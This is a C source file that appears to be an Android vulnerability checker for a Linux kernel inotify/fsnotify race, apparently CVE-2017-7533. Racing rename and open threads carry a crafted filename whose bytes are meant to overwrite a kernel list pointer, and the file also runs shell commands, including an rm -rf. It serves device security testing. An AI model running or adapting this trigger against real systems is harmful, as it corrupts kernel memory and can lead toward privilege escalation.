#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
#include <sys/eventfd.h>
#include <sys/inotify.h>
#include <sys/mman.h>
#include <ctype.h>
#include <errno.h>
#include <err.h>
#include <poll.h>
#include <unistd.h>
#include "idf.h"

void *callrename(void *ptr);
void *openclose(void *ptr);
pthread_t thread1, thread2;
int lastfd;
char *space;
int original, printed, *int_space;
int success = 0;

volatile int stop = 0;

// Try kmalloc-192 made by cyclic(100)
char *orig_name = "f";

static void handle_events(int fd, int *wd, int argc, char *argv[])
{
    /* Some systems cannot read integer variables if they are not
      properly aligned. On other systems, incorrect alignment may
      decrease performance. Hence, the buffer used for reading from
      the inotify file descriptor should have the same alignment as
      struct inotify_event. */

    char buf[4096]
        __attribute__((aligned(__alignof__(struct inotify_event))));
    const struct inotify_event *event;
    int i;
    ssize_t len;
    char *ptr;

    /* Loop while events can be read from inotify file descriptor. */
    for (;;)
    {
        /* Read some events. */
        len = read(fd, buf, sizeof buf);
        if (len == -1 && errno != EAGAIN)
        {
            perror("read");
            exit(EXIT_FAILURE);
        }

        /* If the nonblocking read() found no events to read, then
          it returns -1 with errno set to EAGAIN. In that case,
          we exit the loop. */
        if (len <= 0)
            break;

        /* Loop over all events in the buffer */
        for (ptr = buf; ptr < buf + len;
             ptr += sizeof(struct inotify_event) + event->len)
        {

            event = (const struct inotify_event *)ptr;

            /* Print the name of the file */
            if (event->len && strcmp(event->name, orig_name))
            {
                if (!strcmp(event->name, "b") && strlen(event->name) == 1)
                {
                    stop = 1;
                    success = 1;
                    break;
                }
            }
        }
    }
}

static void *notify_thread_func(void *arg)
{
    char buf;
    int fd, i, poll_num;
    int *wd;
    nfds_t nfds;
    struct pollfd fds[2];
    int argc = 2;
    char *argv[] = {NULL, "test_7533", NULL};

    /* Create the file descriptor for accessing the inotify API */
    fd = inotify_init1(IN_NONBLOCK);
    if (fd == -1)
    {
        perror("inotify_init1");
        exit(EXIT_FAILURE);
    }

    /* Allocate memory for watch descriptors */
    wd = calloc(argc, sizeof(int));
    if (wd == NULL)
    {
        perror("calloc");
        exit(EXIT_FAILURE);
    }

    /* Mark directories for events
      - file was opened
      - file was closed */
    for (i = 1; i < argc; i++)
    {
        wd[i] = inotify_add_watch(fd, argv[i],
                                  IN_OPEN | IN_CLOSE | IN_ACCESS);
        if (wd[i] == -1)
        {
            fprintf(stderr, "Cannot watch '%s'\n", argv[i]);
            perror("inotify_add_watch");
            exit(EXIT_FAILURE);
        }
    }

    /* Prepare for polling */
    nfds = 2;
    /* Console input */
    fds[0].fd = STDIN_FILENO;
    fds[0].events = POLLIN;

    /* Inotify input */
    fds[1].fd = fd;
    fds[1].events = POLLIN;

    while (!stop)
    {
        poll_num = poll(fds, nfds, -1);
        if (poll_num == -1)
        {
            if (errno == EINTR)
                continue;
            perror("poll");
            exit(EXIT_FAILURE);
        }
        if (poll_num > 0)
        {
            if (fds[1].revents & POLLIN)
            {
                handle_events(fd, wd, argc, argv);
            }
        }
    }

    close(fd);

    free(wd);
    exit(EXIT_SUCCESS);
}

void *trigger_rename_open(void *arg)
{
    int iret1, iret2, i;

    setvbuf(stdout, 0, 2, 0);
    iret1 = pthread_create(&thread1, NULL, callrename, NULL);
    if (iret1)
    {
        fprintf(stderr, "Error - pthread_create() return code: %d\n", iret1);
        exit(EXIT_FAILURE);
    }

    iret2 = pthread_create(&thread2, NULL, openclose, NULL);
    if (iret2)
    {
        fprintf(stderr, "Error - pthread_create() return code: %d\n", iret2);
        exit(EXIT_FAILURE);
    }
    pthread_join(thread1, NULL);
    pthread_join(thread2, NULL);
    exit(EXIT_SUCCESS);
}

char *longname_padding = "bbbb3210321032103210";

void *callrename(void *ptr)
{
    int i, m, k;
    char enter = 0;
    char origname[1024] = {0};
    char longname[1024] = {0};
    char next_ptr[8] = "\x30\xff\xff\x31\xff\xff\xff\xff";
    char prev_ptr[8] = "";
    // This value will overwrite the next (struct fsnotify_event)event->list.next

    // create shortname being initial name.
    snprintf(origname, sizeof origname, "test_dir/%s", orig_name);
    printf("alloc_len : %d\n", 48 + strlen(orig_name) + 1);
    printf("origname=\"%s\"\n", origname);

    snprintf(longname, sizeof longname, "test_dir/%s%s%s",
             longname_padding, next_ptr, prev_ptr);
    longname[37] = 0;
    printf("longname=\"%s\"\n", longname);

    for (i = 0; i < 100000 && !stop; i++)
    {
        if (rename(origname, longname) < 0)
            perror("rename1");
        if (rename(longname, origname) < 0)
            perror("rename2");
    }
}

void *openclose(void *ptr)
{
    int j, fd, m, k;
    char origname[1024];
    snprintf(origname, sizeof origname, "test_dir/%s", orig_name);

    for (j = 0; j < 80000 && !stop; j++)
    {
        open(origname, O_RDWR);
    }
    printf("alloc_len : %d\n", 48 + strlen(orig_name) + 1);
}

int check(int argc, char **argv)
{
    pthread_t notify_thread[4];
    pthread_t rename_thread;
    int i = 0;

    char buf[1024];
    snprintf(buf, sizeof buf, "touch test_dir/%s", orig_name);
    system("rm -rf /data/local/tmp/test_dir ; mkdir test_dir");
    system(buf);

    for (i; i < 2; i++)
    {
        pthread_create(&notify_thread[i],
                       NULL,
                       notify_thread_func,
                       NULL);
    }
    //Trigger inotify event by file open and rename to
    //trigger the vulnerability
    pthread_create(&rename_thread, NULL, trigger_rename_open, NULL);

    pthread_join(rename_thread, NULL);
    for (i = 0; i < 2; i++)
        pthread_join(notify_thread[i], NULL);

    if (success == 1)
        return VULNERABLE;
    else
        return NOT_VULNERABLE;
}

int main(int argc, char **argv)
{
    return check(argc, argv);
}